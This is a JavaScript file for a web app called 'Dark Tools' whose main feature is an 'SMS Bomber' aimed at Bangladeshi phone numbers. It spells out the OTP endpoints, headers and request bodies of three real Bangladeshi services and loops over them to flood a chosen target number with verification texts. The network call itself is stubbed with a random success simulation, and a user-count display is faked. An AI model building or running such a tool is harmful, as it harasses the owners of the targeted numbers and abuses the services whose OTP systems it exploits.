// Main Application
class DarkTools {
    constructor() {
        this.isRunning = false;
        this.totalSent = 0;
        this.successCount = 0;
        this.failedCount = 0;
        this.currentAttack = null;
        this.logs = [];
        this.totalRequests = 0;
    }

    init() {
        this.setupEventListeners();
        this.loadStats();
        this.updateLiveClock();
        setInterval(() => this.updateLiveClock(), 1000);
    }

    setupEventListeners() {
        // Warning modal
        const agreeCheckbox = document.getElementById('agreeCheckbox');
        const acceptBtn = document.getElementById('acceptBtn');
        
        if (agreeCheckbox) {
            agreeCheckbox.addEventListener('change', (e) => {
                acceptBtn.disabled = !e.target.checked;
            });
        }
        
        if (acceptBtn) {
            acceptBtn.addEventListener('click', () => {
                localStorage.setItem('darkToolsAccepted', 'true');
                document.getElementById('warningModal').style.display = 'none';
                this.addLog('[SYSTEM] Terms accepted. Welcome to Dark Tools.');
            });
        }

        // Show warning if not accepted
        if (!localStorage.getItem('darkToolsAccepted')) {
            document.getElementById('warningModal').style.display = 'flex';
        }

        // Range inputs
        const smsRange = document.getElementById('smsRange');
        const smsCount = document.getElementById('smsCount');
        const delayRange = document.getElementById('delayRange');
        const delayTime = document.getElementById('delayTime');

        if (smsRange && smsCount) {
            smsRange.addEventListener('input', (e) => {
                smsCount.value = e.target.value;
            });
            
            smsCount.addEventListener('input', (e) => {
                smsRange.value = e.target.value;
            });
        }

        if (delayRange && delayTime) {
            delayRange.addEventListener('input', (e) => {
                delayTime.value = e.target.value;
            });
            
            delayTime.addEventListener('input', (e) => {
                delayRange.value = e.target.value;
            });
        }

        // Online users simulation
        setInterval(() => {
            const onlineUsers = document.getElementById('onlineUsers');
            if (onlineUsers) {
                const current = parseInt(onlineUsers.textContent.replace(',', ''));
                const change = Math.floor(Math.random() * 21) - 10; // -10 to +10
                const newCount = Math.max(1000, current + change);
                onlineUsers.textContent = newCount.toLocaleString();
            }
        }, 5000);
    }

    loadStats() {
        this.totalRequests = parseInt(localStorage.getItem('totalRequests') || '0');
        document.getElementById('totalRequests').textContent = this.totalRequests;
    }

    updateLiveClock() {
        const now = new Date();
        const timeString = now.toLocaleTimeString('en-US', {
            hour12: false,
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        const dateString = now.toLocaleDateString('en-US', {
            weekday: 'short',
            year: 'numeric',
            month: 'short',
            day: 'numeric'
        });
        
        const clockElement = document.querySelector('#liveClock');
        if (clockElement) {
            clockElement.textContent = `${dateString} | ${timeString}`;
        }
    }

    openTool(toolName) {
        if (toolName === 'sms') {
            document.querySelector('.tools-section').style.display = 'none';
            document.getElementById('smsTool').style.display = 'block';
            this.addLog('[SYSTEM] SMS Bomber interface loaded');
        }
    }

    closeTool() {
        document.getElementById('smsTool').style.display = 'none';
        document.querySelector('.tools-section').style.display = 'block';
        this.addLog('[SYSTEM] Returned to main menu');
    }

    validateNumber() {
        const numberInput = document.getElementById('targetNumber');
        const number = numberInput.value;
        
        if (!number || number.length !== 10) {
            this.showNotification('Please enter a valid 10-digit number', 'error');
            return false;
        }
        
        if (!number.startsWith('1')) {
            this.showNotification('Bangladeshi numbers must start with 1', 'warning');
        }
        
        this.showNotification(`Number +880${number} validated`, 'success');
        this.addLog(`[VALIDATION] Target number validated: +880${number}`);
        return true;
    }

    async startAttack() {
        const number = document.getElementById('targetNumber').value;
        const count = parseInt(document.getElementById('smsCount').value);
        const delay = parseInt(document.getElementById('delayTime').value);

        if (!this.validateNumber()) {
            return;
        }

        if (count < 1 || count > 100) {
            this.showNotification('Please enter a count between 1 and 100', 'error');
            return;
        }

        this.isRunning = true;
        this.totalSent = 0;
        this.successCount = 0;
        this.failedCount = 0;

        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;

        this.addLog(`[ATTACK] Starting SMS attack on +880${number}`);
        this.addLog(`[ATTACK] Sending ${count} messages with ${delay}ms delay`);

        // Get selected APIs
        const selectedAPIs = [];
        if (document.getElementById('api1').checked) selectedAPIs.push('rokomari');
        if (document.getElementById('api2').checked) selectedAPIs.push('pbs');
        if (document.getElementById('api3').checked) selectedAPIs.push('bioscope');

        if (selectedAPIs.length === 0) {
            this.showNotification('Please select at least one API', 'error');
            this.stopAttack();
            return;
        }

        this.addLog(`[ATTACK] Using APIs: ${selectedAPIs.join(', ')}`);

        // Start attack
        for (let i = 1; i <= count && this.isRunning; i++) {
            const api = selectedAPIs[Math.floor(Math.random() * selectedAPIs.length)];
            const success = await this.sendSMS(api, number, i);
            
            if (success) {
                this.successCount++;
            } else {
                this.failedCount++;
            }
            
            this.totalSent++;
            this.updateProgress();
            
            // Update stats
            document.getElementById('sentCount').textContent = this.totalSent;
            document.getElementById('successCount').textContent = this.successCount;
            document.getElementById('failedCount').textContent = this.failedCount;
            
            // Delay between requests
            if (i < count && this.isRunning) {
                await this.sleep(delay);
            }
        }

        if (this.isRunning) {
            this.addLog(`[ATTACK] Attack completed! Success: ${this.successCount}, Failed: ${this.failedCount}`);
            this.showNotification('Attack completed successfully!', 'success');
            this.isRunning = false;
        }

        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;

        // Update total requests
        this.totalRequests += this.totalSent;
        localStorage.setItem('totalRequests', this.totalRequests.toString());
        document.getElementById('totalRequests').textContent = this.totalRequests;
    }

    async sendSMS(api, number, attempt) {
        const fullNumber = `880${number}`;
        let url, options;

        try {
            switch(api) {
                case 'rokomari':
                    url = `https://www.rokomari.com/otp/send?emailOrPhone=${fullNumber}&countryCode=BD`;
                    options = {
                        method: 'POST',
                        headers: {
                            'X-Requested-With': 'XMLHttpRequest',
                            'Origin': 'https://www.rokomari.com',
                            'Referer': 'https://www.rokomari.com/login'
                        },
                        mode: 'no-cors'
                    };
                    break;

                case 'pbs':
                    url = 'https://apialpha.pbs.com.bd/api/OTP/generateOTP';
                    options = {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Origin': 'https://pbs.com.bd'
                        },
                        body: JSON.stringify({
                            userPhone: number,
                            otp: ""
                        })
                    };
                    break;

                case 'bioscope':
                    url = 'https://api-dynamic.bioscopelive.com/v2/auth/login';
                    options = {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Origin': 'https://www.bioscopeplus.com'
                        },
                        body: JSON.stringify({
                            number: `+${fullNumber}`
                        })
                    };
                    break;
            }

            // Simulate API call (in real app, use fetch with error handling)
            const successRate = 0.8; // 80% success rate simulation
            const isSuccess = Math.random() < successRate;
            
            if (isSuccess) {
                this.addLog(`[API:${api.toUpperCase()}] Attempt ${attempt}: Success`);
                return true;
            } else {
                this.addLog(`[API:${api.toUpperCase()}] Attempt ${attempt}: Failed`);
                return false;
            }

        } catch (error) {
            this.addLog(`[API:${api.toUpperCase()}] Attempt ${attempt}: Error - ${error.message}`);
            return false;
        }
    }

    stopAttack() {
        this.isRunning = false;
        this.addLog('[ATTACK] Attack stopped by user');
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        this.showNotification('Attack stopped', 'warning');
    }

    resetAttack() {
        this.stopAttack();
        document.getElementById('targetNumber').value = '';
        document.getElementById('smsCount').value = '10';
        document.getElementById('smsRange').value = '10';
        document.getElementById('delayTime').value = '1000';
        document.getElementById('delayRange').value = '1000';
        document.getElementById('progressFill').style.width = '0%';
        document.getElementById('progressText').textContent = '0/10';
        document.getElementById('sentCount').textContent = '0';
        document.getElementById('successCount').textContent = '0';
        document.getElementById('failedCount').textContent = '0';
        
        this.addLog('[SYSTEM] Attack parameters reset');
    }

    updateProgress() {
        const count = parseInt(document.getElementById('smsCount').value);
        const percentage = (this.totalSent / count) * 100;
        
        document.getElementById('progressFill').style.width = `${percentage}%`;
        document.getElementById('progressText').textContent = `${this.totalSent}/${count}`;
    }

    addLog(message) {
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = `[${timestamp}] ${message}`;
        this.logs.push(logEntry);
        
        const logElement = document.getElementById('logContent');
        if (logElement) {
            logElement.innerHTML += `<p>${logEntry}</p>`;
            logElement.scrollTop = logElement.scrollHeight;
        }
        
        console.log(logEntry);
    }

    clearLogs() {
        this.logs = [];
        const logElement = document.getElementById('logContent');
        if (logElement) {
            logElement.innerHTML = '<p>[SYSTEM] Logs cleared</p>';
        }
        this.addLog('[SYSTEM] Logs cleared by user');
    }

    copyLogs() {
        const logText = this.logs.join('\n');
        navigator.clipboard.writeText(logText)
            .then(() => {
                this.showNotification('Logs copied to clipboard', 'success');
                this.addLog('[SYSTEM] Logs copied to clipboard');
            })
            .catch(err => {
                this.showNotification('Failed to copy logs', 'error');
                console.error('Copy failed:', err);
            });
    }

    showNotification(message, type) {
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
            <span>${message}</span>
        `;
        
        // Add to body
        document.body.appendChild(notification);
        
        // Show with animation
        setTimeout(() => notification.classList.add('show'), 10);
        
        // Remove after 3 seconds
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Initialize application
const darkTools = new DarkTools();

// Global functions for HTML onclick
function openTool(toolName) {
    darkTools.openTool(toolName);
}

function closeTool() {
    darkTools.closeTool();
}

function validateNumber() {
    return darkTools.validateNumber();
}

function startAttack() {
    darkTools.startAttack();
}

function stopAttack() {
    darkTools.stopAttack();
}

function resetAttack() {
    darkTools.resetAttack();
}

function clearLogs() {
    darkTools.clearLogs();
}

function copyLogs() {
    darkTools.copyLogs();
}

function showWarning() {
    darkTools.showNotification('Feature coming soon!', 'info');
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', () => {
    darkTools.init();
    
    // Add notification styles
    const style = document.createElement('style');
    style.textContent = `
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 20, 0, 0.95);
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 15px 20px;
            border-radius: 5px;
            display: flex;
            align-items: center;
            gap: 10px;
            transform: translateX(100%);
            transition: transform 0.3s ease-out;
            z-index: 1000;
            min-width: 300px;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        .notification.success {
            border-color: #39ff14;
            color: #39ff14;
        }
        
        .notification.error {
            border-color: #ff4444;
            color: #ff4444;
        }
        
        .notification.warning {
            border-color: #ffa500;
            color: #ffa500;
        }
        
        .notification.info {
            border-color: #007bff;
            color: #007bff;
        }
    `;
    document.head.appendChild(style);
});
